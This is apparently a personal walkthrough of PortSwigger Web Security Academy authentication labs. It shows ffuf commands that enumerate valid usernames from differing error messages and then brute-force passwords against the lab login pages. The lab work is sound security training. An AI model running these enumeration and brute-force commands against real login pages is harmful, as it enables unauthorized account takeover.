# Authentication

- https://portswigger.net/web-security/authentication/password-based
- https://portswigger.net/web-security/authentication/multi-factor
- https://portswigger.net/web-security/authentication/other-mechanisms

## Username enumeration via different responses

For exact examination of the differences of the requests Burp Intruder or Turbo Intruder could be used. 

But here I simply try to determine if for some username different error than 'Invalid username' is shown:

```
ffuf -u https://0ad9005104c150dd81f343a200e30077.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=XYZ' -fr 'Invalid username'
```

It reviels one username (`an`) with new error: 'Incorect password'. 

Now time to brute-force the password:

```
ffuf -u https://0ad9005104c150dd81f343a200e30077.web-security-academy.net/login -w portswigger-wordlists/passwords -d 'username=an&password=FUZZ' -fr 'Incorrect'
```

And we manage to log in. Response with correct password could be found by different response size, status or regex for error.

## Username enumeration via subtly different responses

The response status never changes and the size is random, because of analitics ids that are different in every request.

Testing with this command did not return great results:

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WongPass'
```

We might try to check if the content of the error message changes, but this time check whole html block with error, to ensure we catch even small differences.

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WongPass' -fr '<p class=is\-warning>Invalid username or password\.</p>'
```

Username found (`academico`). 

Testing worng and correct username responses in Burp Proxy and reviewing them in Comparer revieled that error for correct username was 'Invalid username or password', and for incorrect one was 'Invalid username or password.' (Space instead of dot)

Now time to brute-force the password:

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/passwords -d 'username=academico&password=FUZZ' -fc 200
```

Looked for different status code than 200 - because on success usually there is a redirect 3xx response - and found a matching password.
